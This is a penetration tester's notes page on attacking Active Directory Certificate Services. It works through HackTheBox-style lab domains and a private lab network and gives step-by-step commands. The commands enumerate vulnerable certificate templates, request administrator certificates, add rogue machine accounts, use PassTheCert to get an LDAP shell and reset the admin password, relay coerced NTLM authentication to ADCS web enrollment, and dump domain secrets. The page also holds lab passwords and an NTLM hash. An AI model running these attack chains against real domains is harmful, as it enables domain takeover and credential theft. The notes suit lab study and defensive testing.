# Active Directory Certificate Services (ADCS)

<details>

<summary>What is it?</summary>

* Relies on **misconfigured certificate templates** that allow low-privileged users to enroll for certificates --> used to get Kerberos tickets for higher-privileged accounts

</details>

<details>

<summary>Finding if ADCS is present in domain</summary>

```
nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
```

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```
.\Certify.exe cas
```

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Exploitation (Enrollment Rights: Domain Users)</summary>

```bash
# Identify Vulnerable Templates:
.\Certify.exe find /vulnerable
```

<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Use certipy-ad to request a certificate for domain admin
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -dc-ip 10.10.11.202
```

<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Download on Kali
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py

# Seperate into key and certificate files
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt

# Passthecert using ldap-shell option
python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain sequel.htb -dc-ip 10.10.11.202
whoami
change_password administrator P@ssw0rd123!

evil-winrm -i dc.sequel.htb -u administrator
```

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Exploitation (Enrollment Rights: Domain Computers)</summary>

<figure><img src=".gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

```bash
# Find vulnerable certificates templates
.\Certify.exe find /vulnerable

# Checking MachineAccountQuota for svc_ldap (to add new computers)
nxc ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq

# Add new computer:
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' htb/svc_ldap  -dc-ip 10.10.11.222

# Request certificate:
certipy-ad req -u 'myComputer$'@authority.htb -p h4x -upn administrator@authority.htb -target authority.htb -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.10.11.222

# Save into key and certificate files:
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt

# Use Pass-the-cert to obtain a LDAP shell:
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
whoami
change_password administrator P@ssw0rd123!

evil-winrm -i 10.10.11.222 -u administrator
```

</details>

<details>

<summary>Exploitation (NTLM Relay to ADCS HTTP Endpoints)</summary>

```bash
# Finding ESC8 Vulnerability (Web Enrollment over HTTP)
certipy-ad find -u 'adam@corp.com' -p lab -dc-ip 192.168.167.60 -enabled
cat 20250705224614_Certipy.txt
```

<figure><img src=".gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (368).png" alt=""><figcaption><p>DomainController certificate template is a default template in ADCS and allows both Client and Server Authentication</p></figcaption></figure>

```bash
# Coerce DC (.60) to authenticate with us (.245) via NTLM, (.61) is CA --> relay authentication for certificate request:
impacket-ntlmrelayx -t http://192.168.167.61/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

coercer coerce --target-ip 192.168.167.60 --l 192.168.45.245 -u adam -p lab --filter-method-name EfsRpcAddUsersToFile
```

<figure><img src=".gitbook/assets/image (369).png" alt=""><figcaption><p>Obtained a certificate based on the DomainController certificate template in a pfx format.</p></figcaption></figure>

```bash
# Authenticate to DC as DC machine account with Certipy
certipy-ad auth -pfx DC08$.pfx -dc-ip 192.168.167.60
```

<figure><img src=".gitbook/assets/image (370).png" alt=""><figcaption><p>Got DC machine account and hash</p></figcaption></figure>

```bash
impacket-secretsdump corp.com/'dc08$'@192.168.167.60 -hashes :0e0b464f36ca316cbd3170dad42bea33
```

<figure><img src=".gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

</details>
